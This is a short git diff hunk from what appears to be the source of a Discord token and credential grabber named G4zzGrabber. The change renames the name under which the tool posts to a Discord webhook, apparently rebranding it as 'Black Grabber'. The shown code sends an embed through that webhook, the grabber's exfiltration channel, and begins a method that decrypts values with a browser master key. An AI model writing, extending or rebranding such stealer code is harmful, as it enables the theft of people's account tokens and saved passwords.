@@ -226,7 +226,7 @@ class discord():
 
             embed.set_footer(text="github.com/g4zzlove/G4zzGrabber")
 
-            webhook.send(embed=embed, username="G4zzGrabber",
+            webhook.send(embed=embed, username="Black Grabber",
                          avatar_url="https://i.imgur.com/HjzfjfR.png")
 
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
